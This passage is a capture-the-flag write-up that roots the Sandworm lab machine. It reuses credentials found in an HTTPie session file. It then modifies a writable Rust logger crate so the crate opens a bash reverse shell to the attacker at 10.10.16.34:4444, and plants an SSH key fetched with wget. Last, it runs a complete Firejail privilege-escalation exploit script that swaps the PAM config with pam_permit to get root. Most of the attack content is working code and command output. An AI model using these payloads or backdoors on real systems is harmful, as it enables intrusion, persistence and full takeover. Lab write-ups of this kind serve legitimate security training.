drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 ..
dr-------- 2 nobody nogroup   40 Oct 25 15:12 firejail
drwxrwxr-x 3 nobody atlas   4096 Jan 15  2023 httpie
cd httpie
ls
sessions
ls -la
total 12
drwxrwxr-x 3 nobody atlas 4096 Jan 15  2023 .
drwxrwxr-x 4 atlas  atlas 4096 Jan 15  2023 ..
drwxrwxr-x 3 nobody atlas 4096 Jan 15  2023 sessions
cat sessions
cat: sessions: Is a directory
cd sessions
ls -la
total 12
drwxrwxr-x 3 nobody atlas 4096 Jan 15  2023 .
drwxrwxr-x 3 nobody atlas 4096 Jan 15  2023 ..
drwxrwx--- 2 nobody atlas 4096 May  4 17:30 localhost_5000
cat localhost_5000
cat: localhost_5000: Is a directory
cd localhost_5000
ls -la
total 12
drwxrwx--- 2 nobody atlas 4096 May  4 17:30 .
drwxrwxr-x 3 nobody atlas 4096 Jan 15  2023 ..
-rw-r--r-- 1 nobody atlas  611 May  4 17:26 admin.json
cat admin.json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```

Then we use those creds with ssh and we get user access.

```bash
$ ssh silentobserver@10.10.11.218
quietLiketheWind22

silentobserver@sandworm:/opt/crates/logger$ cat ~/user.txt
36df188c386fc9ec18dfb3a85509c954
```

## Privilege escalation

The root user compiles a project with cargo rust:

```bash
silentobserver@sandworm:~$ find / -perm -4000 2>/dev/null
/opt/tipnet/target/debug/tipnet
/opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
/opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
/usr/local/bin/firejail
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/su
/usr/bin/fusermount3


$ ps aux | grep cargo
root      468611  0.0  0.0   2888  1004 ?        Ss   19:16   0:00 /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
root      468613  0.0  0.1  11660  5796 ?        S    19:16   0:00 /bin/sudo -u atlas /usr/bin/cargo run --offline
```

Project code:

```bash
silentobserver@sandworm:/opt/tipnet$ ls -la
total 116
drwxr-xr-x 5 root  atlas  4096 Jun  6 11:49 .
drwxr-xr-x 4 root  root   4096 Jun 30 19:16 ..
-rw-rw-r-- 1 atlas atlas 35548 Jun 30 19:16 access.log
-rw-r--r-- 1 root  atlas 46161 May  4 16:38 Cargo.lock
-rw-r--r-- 1 root  atlas   288 May  4 15:50 Cargo.toml
drwxr-xr-- 6 root  atlas  4096 Jun  6 11:49 .git
-rwxr-xr-- 1 root  atlas     8 Feb  8 09:10 .gitignore
drwxr-xr-x 2 root  atlas  4096 Jun  6 11:49 src
drwxr-xr-x 3 root  atlas  4096 Jun  6 11:49 target
```

The program uses a third-party logger library that connects locally:

```bash
silentobserver@sandworm:/opt/tipnet$ cat Cargo.toml
[package]
name = "tipnet"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
chrono = "0.4"
mysql = "23.0.1"
nix = "0.18.0"
logger = {path = "../crates/logger"}
sha2 = "0.9.0"
hex = "0.4.3"
```

Code for using the logger library:

```bash
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

fn main() {
    println!("
             ,,
MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm
P'   MM   `7               MMN.    M           MM
     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM
     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM
     MM      MM   MM   ,AP M     YMM YM.    ,  MM
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo
                  MM
                .JMML.

");
...
```

Let's look at the library itself:

```bash
silentobserver@sandworm:/opt/crates$ ls -la
total 12
drwxr-xr-x 3 root  atlas          4096 May  4 17:26 .
drwxr-xr-x 4 root  root           4096 Jun 30 19:20 ..
drwxr-xr-x 5 atlas silentobserver 4096 May  4 17:08 logger
```

We can write to this file! Let's write the payload:

```bash
silentobserver@sandworm:/opt/crates/logger/src$ nano lib.rs

extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    let command = "bash -i >& /dev/tcp/10.10.16.34/4444 0>&1";

    let output = Command::new("bash")
        .arg("-c")
        .arg(command)
        .output()
        .expect("panic");

    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        println!("stout: {}", stdout);
        println!("stderr: {}", stderr);
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        eprintln!("stderr: {}", stderr);
    }

    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

And run the build:

```bash
silentobserver@sandworm:/opt/crates/logger$ cargo build
```

Catching shell:

```bash
$ ssh-keygen -t rsa -b 4096 -f test
$ mv test.pub authorized_keys
$ python3 -m http.server 8443
10.10.11.218 - - [25/Oct/2023 19:27:19] "GET /authorized_keys HTTP/1.1" 200 -

$ nc -lnvp 4444
listening on [any] 4444 ...
id
connect to [10.10.16.34] from (UNKNOWN) [10.10.11.218] 52982
bash: cannot set terminal process group (6372): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
atlas@sandworm:~/.ssh$ wget http://10.10.16.34:8443/authorized_keys
wget http://10.10.16.34:8443/authorized_keys
--2023-10-25 16:27:19--  http://10.10.16.34:8443/authorized_keys
Connecting to 10.10.16.34:8443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3381 (3.3K) [application/octet-stream]
Saving to: ‘authorized_keys’

     0K ...                                                   100% 12.9M=0s

2023-10-25 16:27:19 (12.9 MB/s) - ‘authorized_keys’ saved [3381/3381]

atlas@sandworm:~/.ssh$ chmod 600 authorized_keys
chmod 600 authorized_keys
atlas@sandworm:~/.ssh$ ls -al
ls -al
total 12
drwx------ 2 atlas atlas 4096 Oct 25 16:27 .
drwxr-xr-x 8 atlas atlas 4096 Oct 25 16:22 ..
-rw------- 1 atlas atlas 3381 Oct 25 16:26 authorized_keys
```

## SUID

Look for all binaries with suid flag:

```bash
$ find \-perm -4000 -user root 2>/dev/null
...
/usr/local/bin/firejail
...
$ ls -la /usr/local/bin/firejail
-rwsr-x--- 1 root jailer 1777952 Nov 29  2022 /usr/local/bin/firejail
```

It has SUID permission. So we can use that for exploitation. We search in Google for Firejail Exploit. We found this [here](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25).

We copy it in **atlas** shell and named it as exp.py and gave it executable permission.

```python
#!/usr/bin/python3

import os
import shutil
import stat
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Print error message and exit with status 1
def printe(*args, **kwargs):
    kwargs['file'] = sys.stderr
    print(*args, **kwargs)
    sys.exit(1)

# Return a boolean whether the given file path fulfils the requirements for the
# exploit to succeed:
# - owned by uid 0
# - size of 1 byte
# - the content is a single '1' ASCII character
def checkFile(f):
    s = os.stat(f)

    if s.st_uid != 0 or s.st_size != 1 or not stat.S_ISREG(s.st_mode):
        return False

    with open(f) as fd:
        ch = fd.read(2)

        if len(ch) != 1 or ch != "1":
            return False

    return True

def mountTmpFS(loc):
    subprocess.check_call("mount -t tmpfs none".split() + [loc])

def bindMount(src, dst):
    subprocess.check_call("mount --bind".split() + [src, dst])

def checkSelfExecutable():
    s = os.stat(__file__)

    if (s.st_mode & stat.S_IXUSR) == 0:
        printe(f"{__file__} needs to have the execute bit set for the exploit to \
work. Run `chmod +x {__file__}` and try again.")

# This creates a "helper" sandbox that serves the purpose of making available
# a proper "join" file for symlinking to as part of the exploit later on.
#
# Returns a tuple of (proc, join_file), where proc is the running subprocess
# (it needs to continue running until the exploit happened) and join_file is
# the path to the join file to use for the exploit.
def createHelperSandbox():
    # just run a long sleep command in an unsecured sandbox
    proc = subprocess.Popen(
            "firejail --noprofile -- sleep 10d".split(),
            stderr=subprocess.PIPE)

    # read out the child PID from the stderr output of firejail
    while True:
        line = proc.stderr.readline()
        if not line:
            raise Exception("helper sandbox creation failed")

        # on stderr a line of the form "Parent pid <ppid>, child pid <pid>" is output
        line = line.decode('utf8').strip().lower()
        if line.find("child pid") == -1:
            continue

        child_pid = line.split()[-1]

        try:
            child_pid = int(child_pid)
            break
        except Exception:
            raise Exception("failed to determine child pid from helper sandbox")

    # We need to find the child process of the child PID, this is the
    # actual sleep process that has an accessible root filesystem in /proc
    children = f"/proc/{child_pid}/task/{child_pid}/children"

    # If we are too quick then the child does not exist yet, so sleep a bit
    for _ in range(10):
        with open(children) as cfd:
            line = cfd.read().strip()
            kids = line.split()
            if not kids:
                time.sleep(0.5)
                continue
            elif len(kids) != 1:
                raise Exception(f"failed to determine sleep child PID from helper \
sandbox: {kids}")

            try:
                sleep_pid = int(kids[0])
                break
            except Exception:
                raise Exception("failed to determine sleep child PID from helper \sandbox")  
            else:
                raise Exception(f"sleep child process did not come into existence in {children}")

    join_file = f"/proc/{sleep_pid}/root/run/firejail/mnt/join"
    if not os.path.exists(join_file):
        raise Exception(f"join file from helper sandbox unexpectedly not found at \
{join_file}")

    return proc, join_file

# Re-executes the current script with unshared user and mount namespaces
def reexecUnshared(join_file):

    if not checkFile(join_file):
        printe(f"{join_file}: this file does not match the requirements (owner uid 0, \
size 1 byte, content '1')")

    os.environ["FIREJOIN_JOINFILE"] = join_file
    os.environ["FIREJOIN_UNSHARED"] = "1"

    unshare = shutil.which("unshare")
    if not unshare:
        printe("could not find 'unshare' program")

    cmdline = "unshare -U -r -m".split()
    cmdline += [__file__]

    # Re-execute this script with unshared user and mount namespaces
    subprocess.call(cmdline)

if "FIREJOIN_UNSHARED" not in os.environ:
    # First stage of execution, we first need to fork off a helper sandbox and
    # an exploit environment
    checkSelfExecutable()
    helper_proc, join_file = createHelperSandbox()
    reexecUnshared(join_file)

    helper_proc.kill()
    helper_proc.wait()
    sys.exit(0)
else:
    # We are in the sandbox environment, the suitable join file has been
    # forwarded from the first stage via the environment
    join_file = os.environ["FIREJOIN_JOINFILE"]

# We will make /proc/1/ns/user point to this via a symlink
time_ns_src = "/proc/self/ns/time"

# Make the firejail state directory writeable, we need to place a symlink to
# the fake join state file there
mountTmpFS("/run/firejail")
# Mount a tmpfs over the proc state directory of the init process, to place a
# symlink to a fake "user" ns there that firejail thinks it is joining
try:
    mountTmpFS("/proc/1")
except subprocess.CalledProcessError:
    # This is a special case for Fedora Linux where SELinux rules prevent us
    # from mounting a tmpfs over proc directories.
    # We can still circumvent this by mounting a tmpfs over all of /proc, but
    # we need to bind-mount a copy of our own time namespace first that we can
    # symlink to.
    with open("/tmp/time", 'w') as _:
        pass
    time_ns_src = "/tmp/time"
    bindMount("/proc/self/ns/time", time_ns_src)
    mountTmpFS("/proc")

FJ_MNT_ROOT = Path("/run/firejail/mnt")

# Create necessary intermediate directories
os.makedirs(FJ_MNT_ROOT)
os.makedirs("/proc/1/ns")

# Firejail expects to find the umask for the "container" here, else it fails
with open(FJ_MNT_ROOT / "umask", 'w') as umask_fd:
    umask_fd.write("022")

# Create the symlink to the join file to pass Firejail's sanity check
os.symlink(join_file, FJ_MNT_ROOT / "join")
# Since we cannot join our own user namespace again fake a user namespace that
# is actually a symlink to our own time namespace. This works since Firejail
# calls setns() without the nstype parameter.
os.symlink(time_ns_src, "/proc/1/ns/user")

# The process joining our fake sandbox will still have normal user privileges,
# but it will be a member of the mount namespace under the control of *this*
# script while *still* being a member of the initial user namespace.
# 'no_new_privs' won't be set since Firejail takes over the settings of the
# target process.
#
# This means we can invoke setuid-root binaries as usual but they will operate
# in a mount namespace under our control. To exploit this we need to adjust
# file system content in a way that a setuid-root binary grants us full
# root privileges. 'su' and 'sudo' are the most typical candidates for it.
#
# The tools are hardened a bit these days and reject certain files if not owned
# by root e.g. /etc/sudoers. There are various directions that could be taken,
# this one works pretty well though: Simply replacing the PAM configuration
# with one that will always grant access.
with tempfile.NamedTemporaryFile('w') as tf:
    tf.write("auth sufficient pam_permit.so\n")
    tf.write("account sufficient pam_unix.so\n")
    tf.write("session sufficient pam_unix.so\n")

    # Be agnostic about the PAM config file location in /etc or /usr/etc
    for pamd in ("/etc/pam.d", "/usr/etc/pam.d"):
        if not os.path.isdir(pamd):
            continue
        for service in ("su", "sudo"):
            service = Path(pamd) / service
            if not service.exists():
                continue
            # Bind mount over new "helpful" PAM config over the original
            bindMount(tf.name, service)

print(f"You can now run 'firejail --join={os.getpid()}' in another terminal to obtain \
a shell where 'sudo su -' should grant you a root shell.")

while True:
    line = sys.stdin.readline()
    if not line:
        break
```

```bash
$ ssh -i test atlas@10.10.11.218

atlas@sandworm:~$ wget http://10.10.16.34:8443/exp.py
--2023-10-25 16:30:24--  http://10.10.16.34:8443/exp.py
Connecting to 10.10.16.34:8443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 7953 (7.8K) [text/x-python]
Saving to: ‘exp.py’

exp.py                                    100%[=====================================================================================>]   7.77K  --.-KB/s    in 0s

2023-10-25 16:30:24 (395 MB/s) - ‘exp.py’ saved [7953/7953]

atlas@sandworm:~$ chmod +x exp.py
atlas@sandworm:~$ python3 exp.py
You can now run 'firejail --join=7283' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
client_loop: send disconnect: Broken pipe
```

It is saying to join a session number in another terminal and then saying to Execute ```su -``` command. So we again open a shell as **atlas** user using ssh and id_rsa. And type the following command.

```bash
$ ssh -i test atlas@10.10.11.218

atlas@sandworm:~$ firejail --join=7283
changing root to /proc/7283/root
Warning: cleaning all supplementary groups
Child process initialized in 9.30 ms
atlas@sandworm:~$ su -
root@sandworm:~# id
uid=0(root) gid=0(root) groups=0(root)
root@sandworm:~# ll
total 52
drwx------  7 root root 4096 Jun  7 15:19 ./
drwxr-xr-x 19 root root 4096 Jun  7 13:53 ../
lrwxrwxrwx  1 root root    9 Jan 20  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  3 root root 4096 Jun  7 09:57 .config/
drwx------  2 root root 4096 May  4 16:07 .gnupg/
drwxr-xr-x  3 root root 4096 May  7  2020 .local/
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Jun  6 10:13 .ssh/
drwxr-xr-x  4 root root 4096 May  5 08:59 Cleanup/
-rw-r--r--  1 root root 1326 May  4 18:03 domain.crt
-rw-r--r--  1 root root 1094 May  4 18:02 domain.csr
-rw-------  1 root root 1704 May  4 18:01 domain.key
-rw-r-----  1 root root   33 Oct 25 15:12 root.txt
root@sandworm:~# cat root.txt
1e47fb6e9d0dba91fa9f18ab0831a614
```

And we get root shell and the root flag.